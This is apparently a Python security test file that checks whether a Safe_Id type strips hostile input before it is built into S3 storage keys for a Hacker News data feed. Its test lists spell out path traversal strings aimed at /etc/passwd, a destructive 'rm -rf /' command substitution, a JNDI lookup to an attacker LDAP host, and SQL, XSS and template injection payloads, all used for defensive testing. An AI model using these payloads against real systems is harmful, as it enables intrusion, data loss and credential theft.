from unittest                                                                       import TestCase
from myfeeds_ai.data_feeds.Data_Feeds__S3__Key_Generator                 import Data_Feeds__S3__Key_Generator
from myfeeds_ai.data_feeds.Data_Feeds__Shared_Constants                  import S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA
from myfeeds_ai.providers.cyber_security.hacker_news.Hacker_News__S3_DB  import Hacker_News__S3_DB
from osbot_utils.helpers.Safe_Id                                                    import Safe_Id

class test__security__Hacker_News__S3_DB(TestCase):

    @classmethod
    def setUpClass(cls):
        cls.s3_db_hacker_news = Hacker_News__S3_DB()
        cls.s3_db_hacker_news.s3_key_generator.split_when = False

    def test__init__(self):
        with self.s3_db_hacker_news as _:
            assert type(_.s3_key_generator) is Data_Feeds__S3__Key_Generator

    def test__security__s3_key__path_traversal_attempts(self):                                          # Test that path traversal attempts are properly sanitized by Safe_Id
        with self.s3_db_hacker_news as _:
            when_path_elements = _.s3_key_generator.create_path_elements__from_when().pop()
            good_file_id = Safe_Id('valid-file')

            traversal_patterns = ['../../../etc/passwd'           ,                                     # Unix path traversal
                                  '..\\..\\Windows\\System32'     ,                                     # Windows path traversal
                                  '%2e%2e%2fadmin'                ,                                     # URL encoded path traversal
                                  '....//....//config'            ,                                     # Multiple dot path traversal
                                  '/var/www/../../secret'         ,                                     # Mixed path traversal
                                  'area/../../config'             ,                                     # Relative path traversal
                                  '\\etc\\shadow'                 ,                                     # Windows-style path
                                  'file://localhost/etc/hosts'    ,                                     # File protocol injection
                                  '../' * 10 + 'secret'           ,                                     # Deep traversal
                                  '%252e%252e%252f'               ]                                     # Double URL encoding


            for malicious_input in traversal_patterns:
                safe_area = Safe_Id(malicious_input)                                                    # Test that the input is sanitized into Safe_Id
                safe_file = Safe_Id(malicious_input)

                unsafe_patterns = ['..', '../', '..\\', '/etc/', '\\etc\\', '\passwd']                  # Verify sanitized values don't contain dangerous patterns
                for pattern in unsafe_patterns:
                    assert pattern not in safe_area, f"Unsafe pattern {pattern} found in {safe_area}"
                    assert pattern not in safe_file, f"Unsafe pattern {pattern} found in {safe_file}"

                # Verify the final S3 key is properly sanitized
                result = _.s3_key_generator.s3_key(area=safe_area, file_id=good_file_id)
                assert result.startswith(f'{S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA}/'), f"Invalid S3 key structure: {result}"
                assert result.endswith('.json'), f"Invalid S3 key extension: {result}"
                assert result == f"{S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA}/{safe_area}/{when_path_elements}/{good_file_id}.json"

    def test__security__s3_key__injection_attempts(self):                                                          # Test that injection attempts are properly handled
        with self.s3_db_hacker_news as _:
            when_path_elements = _.s3_key_generator.create_path_elements__from_when().pop()
            good_file_id = Safe_Id('valid-file')

            injection_patterns = [
                '$(rm -rf /)'                ,  # Command injection
                '${jndi:ldap://attacker/exploit}',  # JNDI injection
                '{{7*7}}'                    ,  # Template injection
                '; drop table users--'       ,  # SQL injection
                '"><script>alert(1)</script>',  # XSS attempt
                '|cat /etc/passwd'           ,  # Command chain
                '\x00../../etc/passwd'       ,  # Null byte injection
                '${{env.SECRET_KEY}}'        ,  # Environment variable injection
                '&&calc'                     ,  # Command chaining
                '%0a$(sleep 5)'              ,  # Newline injection
            ]

            for malicious_input in injection_patterns:
                safe_id = Safe_Id(malicious_input)                                                    # Test that each injection attempt is converted to a safe string

                unsafe_chars = ['$', '{', '}', '<', '>', '|', ';', '&&', "'", '"', '\x00']            # Verify sanitized value doesn't contain dangerous patterns
                for char in unsafe_chars:
                    assert char not in safe_id, f"Unsafe character {char} found in {safe_id}"

                result = _.s3_key_generator.s3_key(area=safe_id, file_id=good_file_id)                                 # Verify S3 key generation works with sanitized value
                assert '//' not in result, f"Double slash found in S3 key: {result}"
                assert result.count('/') >= 2, f"Invalid path structure in S3 key: {result}"
                assert result == f"{S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA}/{safe_id}/{when_path_elements}/{good_file_id}.json"

    def test__security__s3_key__type_safety(self):                                           # Test that non-string/non-int types are properly rejected
        with self.s3_db_hacker_news as _:
            invalid_types = [[]             ,  # List
                             {}             ,  # Dict
                             set()          ,  # Set
                             lambda x: x    ,  # Function
                             object()       ,  # Generic object
                             True           ,  # Boolean
                             3.14           ,  # Float
                             complex(1, 1)  ]  # Complex number

            for invalid_input in invalid_types:
                with self.assertRaises(ValueError) as context:                          # Test area parameter
                    _.s3_key_generator.s3_key(area=invalid_input, file_id='valid-file')
                assert "type" in str(context.exception).lower()


                with self.assertRaises(ValueError) as context:                          # Test file_id parameter
                    _.s3_key_generator.s3_key(area='valid-area', file_id=invalid_input)
                assert "type" in str(context.exception).lower()

    def test__security__s3_key__encoding_handling(self):                                           # Test that various encoding attempts are properly sanitized
        with self.s3_db_hacker_news as _:
            when_path_elements = _.s3_key_generator.create_path_elements__from_when().pop()
            encoding_patterns = ['area\x00../../etc'  ,  # Null byte
                                 'area\u0000../../etc',  # Unicode null
                                 'area\r\n../../etc'  ,  # CRLF
                                 'area%00../../etc'   ,  # URL encoded null
                                 'area␀../../etc'     ,  # Unicode control char
                                 'area\t../../etc'    ,  # Tab character
                                 'area\v../../etc'    ,  # Vertical tab
                                 'area\f../../etc'    ,  # Form feed
                                 'area%0a../../etc'   ,  # URL encoded newline
                                 'area%2e%2e%2f'      ]  # URL encoded ../

            for encoded_input in encoding_patterns:
                safe_id = Safe_Id(encoded_input)                                                    # Verify Safe_Id sanitizes encoded values

                control_chars = ['\x00', '\u0000', '\r', '\n', '\t', '\v', '\f']                    # Check that control characters are removed or replaced
                for char in control_chars:
                    assert char not in safe_id, f"Control character found in {safe_id}"

                result = _.s3_key_generator.s3_key(area=safe_id, file_id=Safe_Id('valid-file'))                               # Verify S3 key is properly formatted
                assert result.startswith(f'{S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA}/'), f"Invalid S3 key prefix: {result}"
                assert len(result.split('/')) >= 3, f"Invalid path depth in S3 key: {result}"
                assert result == f"{S3_FOLDER__ROOT_FOLDER__PUBLIC_DATA}/{safe_id}/{when_path_elements}/valid-file.json"